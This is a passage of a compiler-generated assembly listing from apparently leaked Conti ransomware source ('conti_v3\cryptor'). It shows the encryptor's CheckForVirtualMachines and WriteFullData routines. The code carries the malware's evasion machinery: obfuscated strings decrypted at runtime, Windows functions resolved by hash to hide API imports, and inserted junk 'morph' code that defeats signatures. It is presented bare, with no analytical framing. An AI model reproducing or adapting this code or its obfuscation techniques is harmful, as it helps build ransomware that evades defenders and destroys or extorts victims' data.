  00c47	84 c0		 test	 al, al
  00c49	75 56		 jne	 SHORT $LN694@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00c4b	4c 8b c3	 mov	 r8, rbx
  00c4e	66 90		 npad	 2
$LL695@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00c50	42 0f b6 4c 05
	21		 movzx	 ecx, BYTE PTR $T19[rbp+r8-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00c56	b8 22 00 00 00	 mov	 eax, 34			; 00000022H
  00c5b	2b c1		 sub	 eax, ecx
  00c5d	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  00c60	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00c65	f7 e9		 imul	 ecx
  00c67	03 d1		 add	 edx, ecx
  00c69	c1 fa 06	 sar	 edx, 6
  00c6c	8b c2		 mov	 eax, edx
  00c6e	c1 e8 1f	 shr	 eax, 31
  00c71	03 d0		 add	 edx, eax
  00c73	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00c76	2b c8		 sub	 ecx, eax
  00c78	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00c7d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00c80	f7 e9		 imul	 ecx
  00c82	03 d1		 add	 edx, ecx
  00c84	c1 fa 06	 sar	 edx, 6
  00c87	8b c2		 mov	 eax, edx
  00c89	c1 e8 1f	 shr	 eax, 31
  00c8c	03 d0		 add	 edx, eax
  00c8e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00c91	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00c93	42 88 4c 05 21	 mov	 BYTE PTR $T19[rbp+r8-255], cl
  00c98	49 ff c0	 inc	 r8
  00c9b	49 83 f8 0c	 cmp	 r8, 12
  00c9f	72 af		 jb	 SHORT $LL695@CheckForVi
$LN694@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 507  : 		OBFW(L".vmcx"),

  00ca1	48 8d 45 21	 lea	 rax, QWORD PTR $T19[rbp-255]
  00ca5	48 89 85 00 01
	00 00		 mov	 QWORD PTR Extensions$[rbp-112], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00cac	88 5d 90	 mov	 BYTE PTR $T20[rbp-256], bl
  00caf	c6 45 91 5b	 mov	 BYTE PTR $T20[rbp-255], 91 ; 0000005bH
  00cb3	c6 45 92 39	 mov	 BYTE PTR $T20[rbp-254], 57 ; 00000039H
  00cb7	c6 45 93 6b	 mov	 BYTE PTR $T20[rbp-253], 107 ; 0000006bH
  00cbb	c6 45 94 39	 mov	 BYTE PTR $T20[rbp-252], 57 ; 00000039H
  00cbf	c6 45 95 0f	 mov	 BYTE PTR $T20[rbp-251], 15
  00cc3	c6 45 96 39	 mov	 BYTE PTR $T20[rbp-250], 57 ; 00000039H
  00cc7	c6 45 97 01	 mov	 BYTE PTR $T20[rbp-249], 1
  00ccb	c6 45 98 39	 mov	 BYTE PTR $T20[rbp-248], 57 ; 00000039H
  00ccf	c6 45 99 39	 mov	 BYTE PTR $T20[rbp-247], 57 ; 00000039H
  00cd3	c6 45 9a 39	 mov	 BYTE PTR $T20[rbp-246], 57 ; 00000039H
  00cd7	0f b6 45 91	 movzx	 eax, BYTE PTR $T20[rbp-255]

; 58   :         return m_isDecrypted;

  00cdb	0f b6 45 90	 movzx	 eax, BYTE PTR $T20[rbp-256]

; 63   :         if (!isDecrypted())

  00cdf	84 c0		 test	 al, al
  00ce1	75 61		 jne	 SHORT $LN728@CheckForVi

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00ce3	4c 8b c3	 mov	 r8, rbx
  00ce6	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL729@CheckForVi:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00cf0	42 0f b6 4c 05
	91		 movzx	 ecx, BYTE PTR $T20[rbp+r8-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00cf6	b8 39 00 00 00	 mov	 eax, 57			; 00000039H
  00cfb	2b c1		 sub	 eax, ecx
  00cfd	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00d00	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00d05	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  00d08	f7 e9		 imul	 ecx
  00d0a	03 d1		 add	 edx, ecx
  00d0c	c1 fa 06	 sar	 edx, 6
  00d0f	8b c2		 mov	 eax, edx
  00d11	c1 e8 1f	 shr	 eax, 31
  00d14	03 d0		 add	 edx, eax
  00d16	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00d19	2b c8		 sub	 ecx, eax
  00d1b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00d20	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00d23	f7 e9		 imul	 ecx
  00d25	03 d1		 add	 edx, ecx
  00d27	c1 fa 06	 sar	 edx, 6
  00d2a	8b c2		 mov	 eax, edx
  00d2c	c1 e8 1f	 shr	 eax, 31
  00d2f	03 d0		 add	 edx, eax
  00d31	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00d34	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00d36	42 88 4c 05 91	 mov	 BYTE PTR $T20[rbp+r8-255], cl
  00d3b	49 ff c0	 inc	 r8
  00d3e	49 83 f8 0a	 cmp	 r8, 10
  00d42	72 ac		 jb	 SHORT $LL729@CheckForVi
$LN728@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 508  : 		OBFW(L".iso")

  00d44	48 8d 45 91	 lea	 rax, QWORD PTR $T20[rbp-255]
  00d48	48 89 85 08 01
	00 00		 mov	 QWORD PTR Extensions$[rbp-104], rax
  00d4f	90		 npad	 1
$LL4@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00d50	c7 85 28 01 00
	00 c1 9b 17 00	 mov	 DWORD PTR _morph_var$21[rbp-256], 1547201 ; 00179bc1H

; 41   : #else
; 42   : 	volatile int _morph_var = a;
; 43   : #endif
; 44   : 
; 45   : 	//      ( ) ,  .
; 46   : 	//   ,      ,      ,
; 47   : 	//  .  ,           .
; 48   : 	if (_morph_var % 3) {

  00d5a	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00d5f	8b 8d 28 01 00
	00		 mov	 ecx, DWORD PTR _morph_var$21[rbp-256]
  00d65	f7 e9		 imul	 ecx
  00d67	8b c2		 mov	 eax, edx
  00d69	c1 e8 1f	 shr	 eax, 31
  00d6c	03 d0		 add	 edx, eax
  00d6e	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00d71	3b c8		 cmp	 ecx, eax
  00d73	74 55		 je	 SHORT $LN20@CheckForVi

; 49   : 		_morph_var += (int)a + 2;

  00d75	8b 8d 28 01 00
	00		 mov	 ecx, DWORD PTR _morph_var$21[rbp-256]
  00d7b	83 c1 02	 add	 ecx, 2
  00d7e	03 cf		 add	 ecx, edi
  00d80	89 8d 28 01 00
	00		 mov	 DWORD PTR _morph_var$21[rbp-256], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00d86	8b 85 28 01 00
	00		 mov	 eax, DWORD PTR _morph_var$21[rbp-256]
  00d8c	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00d91	7d 07		 jge	 SHORT $LN877@CheckForVi
  00d93	ff c8		 dec	 eax
  00d95	83 c8 fc	 or	 eax, -4
  00d98	ff c0		 inc	 eax
$LN877@CheckForVi:
  00d9a	85 c0		 test	 eax, eax
  00d9c	0f 85 87 00 00
	00		 jne	 $LN19@CheckForVi
$LL12@CheckForVi:
  00da2	8b 85 28 01 00
	00		 mov	 eax, DWORD PTR _morph_var$21[rbp-256]
  00da8	ff c0		 inc	 eax
  00daa	89 85 28 01 00
	00		 mov	 DWORD PTR _morph_var$21[rbp-256], eax
  00db0	8b 85 28 01 00
	00		 mov	 eax, DWORD PTR _morph_var$21[rbp-256]
  00db6	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00dbb	7d 07		 jge	 SHORT $LN876@CheckForVi
  00dbd	ff c8		 dec	 eax
  00dbf	83 c8 fc	 or	 eax, -4
  00dc2	ff c0		 inc	 eax
$LN876@CheckForVi:
  00dc4	85 c0		 test	 eax, eax
  00dc6	74 da		 je	 SHORT $LL12@CheckForVi

; 51   : 	}

  00dc8	eb 5f		 jmp	 SHORT $LN19@CheckForVi
$LN20@CheckForVi:

; 52   : 	else if (_morph_var % 2) {

  00dca	8b 85 28 01 00
	00		 mov	 eax, DWORD PTR _morph_var$21[rbp-256]

; 53   : 		_morph_var -= (int)a - 2;

  00dd0	b9 02 00 00 00	 mov	 ecx, 2
  00dd5	8b 85 28 01 00
	00		 mov	 eax, DWORD PTR _morph_var$21[rbp-256]
  00ddb	2b cf		 sub	 ecx, edi
  00ddd	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00ddf	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00de4	89 8d 28 01 00
	00		 mov	 DWORD PTR _morph_var$21[rbp-256], ecx
  00dea	8b 8d 28 01 00
	00		 mov	 ecx, DWORD PTR _morph_var$21[rbp-256]
  00df0	f7 e9		 imul	 ecx
  00df2	8b c2		 mov	 eax, edx
  00df4	c1 e8 1f	 shr	 eax, 31
  00df7	03 d0		 add	 edx, eax
  00df9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00dfc	3b c8		 cmp	 ecx, eax
  00dfe	75 29		 jne	 SHORT $LN19@CheckForVi
$LL14@CheckForVi:
  00e00	8b 85 28 01 00
	00		 mov	 eax, DWORD PTR _morph_var$21[rbp-256]
  00e06	ff c0		 inc	 eax
  00e08	89 85 28 01 00
	00		 mov	 DWORD PTR _morph_var$21[rbp-256], eax
  00e0e	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00e13	8b 8d 28 01 00
	00		 mov	 ecx, DWORD PTR _morph_var$21[rbp-256]
  00e19	f7 e9		 imul	 ecx
  00e1b	8b c2		 mov	 eax, edx
  00e1d	c1 e8 1f	 shr	 eax, 31
  00e20	03 d0		 add	 edx, eax
  00e22	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00e25	3b c8		 cmp	 ecx, eax
  00e27	74 d7		 je	 SHORT $LL14@CheckForVi
$LN19@CheckForVi:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1006 : 	pFunction = (PCWSTR(WINAPI*)(PCWSTR, PCWSTR))getapi::GetProcAddressEx2(NULL, SHLWAPI_MODULE_ID, 0xf8aefe61, 23);//GetProcAddress(hShlwapi, OBFA("StrStrIW"));

  00e29	ba 16 00 00 00	 mov	 edx, 22
  00e2e	41 b8 61 fe ae
	f8		 mov	 r8d, -122749343		; f8aefe61H
  00e34	44 8d 4a 01	 lea	 r9d, QWORD PTR [rdx+1]
  00e38	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1007 : 	return pFunction(pszFirst, pszSrch);

  00e3d	48 8b 54 dd 70	 mov	 rdx, QWORD PTR Extensions$[rbp+rbx*8-256]
  00e42	48 8b cf	 mov	 rcx, rdi
  00e45	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 517  : 		if (pStrStrIW(Filename, Extensions[i])) {

  00e47	48 85 c0	 test	 rax, rax
  00e4a	75 0f		 jne	 SHORT $LN801@CheckForVi

; 509  : 
; 510  : 	};
; 511  : 
; 512  : 	INT Count = sizeof(Extensions) / sizeof(LPWSTR);
; 513  : 	for (INT i = 0; i < Count; i++) {

  00e4c	48 ff c3	 inc	 rbx
  00e4f	48 83 fb 14	 cmp	 rbx, 20
  00e53	0f 8c f7 fe ff
	ff		 jl	 $LL4@CheckForVi

; 519  : 		}
; 520  : 	}
; 521  : 
; 522  : 	return FALSE;

  00e59	eb 05		 jmp	 SHORT $LN1@CheckForVi
$LN801@CheckForVi:

; 518  : 			return TRUE;

  00e5b	b8 01 00 00 00	 mov	 eax, 1
$LN1@CheckForVi:

; 523  : }

  00e60	4c 8d 9c 24 10
	02 00 00	 lea	 r11, QWORD PTR [rsp+528]
  00e68	49 8b 5b 10	 mov	 rbx, QWORD PTR [r11+16]
  00e6c	49 8b 7b 20	 mov	 rdi, QWORD PTR [r11+32]
  00e70	49 8b e3	 mov	 rsp, r11
  00e73	5d		 pop	 rbp
  00e74	c3		 ret	 0
?CheckForVirtualMachines@@YAHPEB_W@Z ENDP		; CheckForVirtualMachines
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?WriteFullData@@YAHPEAX0K@Z
_TEXT	SEGMENT
_morph_var$1 = 48
_morph_var$2 = 48
_morph_var$3 = 48
_morph_var$4 = 48
BytesWritten$ = 52
__$ArrayPad$ = 56
hFile$ = 128
Buffer$ = 136
Size$ = 144
?WriteFullData@@YAHPEAX0K@Z PROC			; WriteFullData, COMDAT

; 532  : {

$LN222:
  00000	48 89 5c 24 20	 mov	 QWORD PTR [rsp+32], rbx
  00005	55		 push	 rbp
  00006	56		 push	 rsi
  00007	57		 push	 rdi
  00008	41 54		 push	 r12
  0000a	41 55		 push	 r13
  0000c	41 56		 push	 r14
  0000e	41 57		 push	 r15
  00010	48 8b ec	 mov	 rbp, rsp
  00013	48 83 ec 40	 sub	 rsp, 64			; 00000040H
  00017	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0001e	48 33 c4	 xor	 rax, rsp
  00021	48 89 45 f8	 mov	 QWORD PTR __$ArrayPad$[rbp-64], rax

; 533  : 	DWORD TotalWritten = 0;

  00025	45 33 ed	 xor	 r13d, r13d
  00028	45 8b f0	 mov	 r14d, r8d

; 534  : 	DWORD BytesWritten = 0;

  0002b	44 89 6d f4	 mov	 DWORD PTR BytesWritten$[rbp-64], r13d
  0002f	4c 8b e2	 mov	 r12, rdx
  00032	4c 8b f9	 mov	 r15, rcx
  00035	41 8b fd	 mov	 edi, r13d

; 535  : 	DWORD BytesToWrite = Size;

  00038	41 8b d8	 mov	 ebx, r8d

; 536  : 	DWORD Offset = 0;

  0003b	41 8b f5	 mov	 esi, r13d

; 537  : 
; 538  : 	while (TotalWritten != Size)

  0003e	45 85 c0	 test	 r8d, r8d
  00041	0f 84 35 03 00
	00		 je	 $LN3@WriteFullD
  00047	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL2@WriteFullD:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00050	c7 45 f0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$4[rbp-64], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00057	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0005c	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$4[rbp-64]
  0005f	f7 e9		 imul	 ecx
  00061	8b c2		 mov	 eax, edx
  00063	c1 e8 1f	 shr	 eax, 31
  00066	03 d0		 add	 edx, eax
  00068	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0006b	3b c8		 cmp	 ecx, eax
  0006d	74 40		 je	 SHORT $LN16@WriteFullD

; 49   : 		_morph_var += (int)a + 2;

  0006f	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$4[rbp-64]
  00072	83 c1 02	 add	 ecx, 2
  00075	03 cf		 add	 ecx, edi
  00077	89 4d f0	 mov	 DWORD PTR _morph_var$4[rbp-64], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0007a	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$4[rbp-64]
  0007d	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00082	7d 07		 jge	 SHORT $LN165@WriteFullD
  00084	ff c8		 dec	 eax
  00086	83 c8 fc	 or	 eax, -4
  00089	ff c0		 inc	 eax
$LN165@WriteFullD:
  0008b	85 c0		 test	 eax, eax
  0008d	75 71		 jne	 SHORT $LN15@WriteFullD
  0008f	90		 npad	 1
$LL8@WriteFullD:
  00090	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$4[rbp-64]
  00093	ff c0		 inc	 eax
  00095	89 45 f0	 mov	 DWORD PTR _morph_var$4[rbp-64], eax
  00098	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$4[rbp-64]
  0009b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  000a0	7d 07		 jge	 SHORT $LN164@WriteFullD
  000a2	ff c8		 dec	 eax
  000a4	83 c8 fc	 or	 eax, -4
  000a7	ff c0		 inc	 eax
$LN164@WriteFullD:
  000a9	85 c0		 test	 eax, eax
  000ab	74 e3		 je	 SHORT $LL8@WriteFullD

; 51   : 	}

  000ad	eb 51		 jmp	 SHORT $LN15@WriteFullD
$LN16@WriteFullD:

; 52   : 	else if (_morph_var % 2) {

  000af	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$4[rbp-64]

; 53   : 		_morph_var -= (int)a - 2;

  000b2	b9 02 00 00 00	 mov	 ecx, 2
  000b7	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$4[rbp-64]
  000ba	2b cf		 sub	 ecx, edi
  000bc	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  000be	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000c3	89 4d f0	 mov	 DWORD PTR _morph_var$4[rbp-64], ecx
  000c6	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$4[rbp-64]
  000c9	f7 e9		 imul	 ecx
  000cb	8b c2		 mov	 eax, edx
  000cd	c1 e8 1f	 shr	 eax, 31
  000d0	03 d0		 add	 edx, eax
  000d2	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  000d5	3b c8		 cmp	 ecx, eax
  000d7	75 27		 jne	 SHORT $LN15@WriteFullD
  000d9	0f 1f 80 00 00
	00 00		 npad	 7
$LL10@WriteFullD:
  000e0	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$4[rbp-64]
  000e3	ff c0		 inc	 eax
  000e5	89 45 f0	 mov	 DWORD PTR _morph_var$4[rbp-64], eax
  000e8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000ed	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$4[rbp-64]
  000f0	f7 e9		 imul	 ecx
  000f2	8b c2		 mov	 eax, edx
  000f4	c1 e8 1f	 shr	 eax, 31
  000f7	03 d0		 add	 edx, eax
  000f9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  000fc	3b c8		 cmp	 ecx, eax
  000fe	74 e0		 je	 SHORT $LL10@WriteFullD
$LN15@WriteFullD:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 122  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x088f1e18, 102);//GetProcAddress(hKernel32, OBFA("WriteFile"));

  00100	ba 0f 00 00 00	 mov	 edx, 15
  00105	41 b8 18 1e 8f
	08		 mov	 r8d, 143597080		; 088f1e18H
  0010b	44 8d 4a 57	 lea	 r9d, QWORD PTR [rdx+87]
  0010f	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 543  : 		if (!pWriteFile(hFile, (LPBYTE)Buffer + Offset, BytesToWrite, &BytesWritten, NULL) || !BytesWritten) {

  00114	8b d6		 mov	 edx, esi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 123  : 	return pFunction(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);

  00116	4c 8d 4d f4	 lea	 r9, QWORD PTR BytesWritten$[rbp-64]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 543  : 		if (!pWriteFile(hFile, (LPBYTE)Buffer + Offset, BytesToWrite, &BytesWritten, NULL) || !BytesWritten) {

  0011a	49 03 d4	 add	 rdx, r12
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 123  : 	return pFunction(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);

  0011d	4c 89 6c 24 20	 mov	 QWORD PTR [rsp+32], r13
  00122	44 8b c3	 mov	 r8d, ebx
  00125	49 8b cf	 mov	 rcx, r15
  00128	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 543  : 		if (!pWriteFile(hFile, (LPBYTE)Buffer + Offset, BytesToWrite, &BytesWritten, NULL) || !BytesWritten) {

  0012a	85 c0		 test	 eax, eax
  0012c	0f 84 73 02 00
	00		 je	 $LN110@WriteFullD
  00132	44 39 6d f4	 cmp	 DWORD PTR BytesWritten$[rbp-64], r13d
  00136	0f 84 69 02 00
	00		 je	 $LN110@WriteFullD
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0013c	c7 45 f0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$3[rbp-64], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00143	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00148	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$3[rbp-64]
  0014b	f7 e9		 imul	 ecx
  0014d	8b c2		 mov	 eax, edx
  0014f	c1 e8 1f	 shr	 eax, 31
  00152	03 d0		 add	 edx, eax
  00154	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00157	3b c8		 cmp	 ecx, eax
  00159	74 44		 je	 SHORT $LN39@WriteFullD

; 49   : 		_morph_var += (int)a + 2;

  0015b	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$3[rbp-64]
  0015e	8b 45 f4	 mov	 eax, DWORD PTR BytesWritten$[rbp-64]
  00161	83 c0 02	 add	 eax, 2
  00164	03 c8		 add	 ecx, eax
  00166	89 4d f0	 mov	 DWORD PTR _morph_var$3[rbp-64], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00169	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$3[rbp-64]
  0016c	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00171	7d 07		 jge	 SHORT $LN162@WriteFullD
  00173	ff c8		 dec	 eax
  00175	83 c8 fc	 or	 eax, -4
  00178	ff c0		 inc	 eax
$LN162@WriteFullD:
  0017a	85 c0		 test	 eax, eax
  0017c	75 72		 jne	 SHORT $LN38@WriteFullD
  0017e	66 90		 npad	 2
$LL31@WriteFullD:
  00180	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$3[rbp-64]
  00183	ff c0		 inc	 eax
  00185	89 45 f0	 mov	 DWORD PTR _morph_var$3[rbp-64], eax
  00188	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$3[rbp-64]
  0018b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00190	7d 07		 jge	 SHORT $LN161@WriteFullD
  00192	ff c8		 dec	 eax
  00194	83 c8 fc	 or	 eax, -4
  00197	ff c0		 inc	 eax
$LN161@WriteFullD:
  00199	85 c0		 test	 eax, eax
  0019b	74 e3		 je	 SHORT $LL31@WriteFullD

; 51   : 	}

  0019d	eb 51		 jmp	 SHORT $LN38@WriteFullD
$LN39@WriteFullD:

; 52   : 	else if (_morph_var % 2) {

  0019f	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$3[rbp-64]

; 53   : 		_morph_var -= (int)a - 2;

  001a2	b9 02 00 00 00	 mov	 ecx, 2
  001a7	2b 4d f4	 sub	 ecx, DWORD PTR BytesWritten$[rbp-64]
  001aa	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$3[rbp-64]
  001ad	03 c1		 add	 eax, ecx
  001af	89 45 f0	 mov	 DWORD PTR _morph_var$3[rbp-64], eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  001b2	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  001b7	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$3[rbp-64]
  001ba	f7 e9		 imul	 ecx
  001bc	8b c2		 mov	 eax, edx
  001be	c1 e8 1f	 shr	 eax, 31
  001c1	03 d0		 add	 edx, eax
  001c3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  001c6	3b c8		 cmp	 ecx, eax
  001c8	75 26		 jne	 SHORT $LN38@WriteFullD
  001ca	66 0f 1f 44 00
	00		 npad	 6
$LL33@WriteFullD:
  001d0	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$3[rbp-64]
  001d3	ff c0		 inc	 eax
  001d5	89 45 f0	 mov	 DWORD PTR _morph_var$3[rbp-64], eax
  001d8	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  001dd	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$3[rbp-64]
  001e0	f7 e9		 imul	 ecx
  001e2	8b c2		 mov	 eax, edx
  001e4	c1 e8 1f	 shr	 eax, 31
  001e7	03 d0		 add	 edx, eax
  001e9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  001ec	3b c8		 cmp	 ecx, eax
  001ee	74 e0		 je	 SHORT $LL33@WriteFullD
$LN38@WriteFullD:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 551  : 		Offset += BytesWritten;

  001f0	03 75 f4	 add	 esi, DWORD PTR BytesWritten$[rbp-64]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  001f3	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  001f8	c7 45 f0 c1 9b
	17 00		 mov	 DWORD PTR _morph_var$2[rbp-64], 1547201 ; 00179bc1H
  001ff	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$2[rbp-64]
  00202	f7 e9		 imul	 ecx
  00204	8b c2		 mov	 eax, edx
  00206	c1 e8 1f	 shr	 eax, 31
  00209	03 d0		 add	 edx, eax
  0020b	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0020e	3b c8		 cmp	 ecx, eax
  00210	74 4d		 je	 SHORT $LN60@WriteFullD

; 49   : 		_morph_var += (int)a + 2;

  00212	8b 4d f0	 mov	 ecx, DWORD PTR _morph_var$2[rbp-64]
  00215	83 c1 02	 add	 ecx, 2
  00218	03 ce		 add	 ecx, esi
  0021a	89 4d f0	 mov	 DWORD PTR _morph_var$2[rbp-64], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0021d	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$2[rbp-64]
  00220	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00225	7d 07		 jge	 SHORT $LN159@WriteFullD
  00227	ff c8		 dec	 eax
  00229	83 c8 fc	 or	 eax, -4
  0022c	ff c0		 inc	 eax
$LN159@WriteFullD:
  0022e	85 c0		 test	 eax, eax
  00230	75 7e		 jne	 SHORT $LN59@WriteFullD
  00232	0f 1f 40 00 66
	66 0f 1f 84 00
	00 00 00 00	 npad	 14
$LL52@WriteFullD:
  00240	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$2[rbp-64]
  00243	ff c0		 inc	 eax
  00245	89 45 f0	 mov	 DWORD PTR _morph_var$2[rbp-64], eax
  00248	8b 45 f0	 mov	 eax, DWORD PTR _morph_var$2[rbp-64]
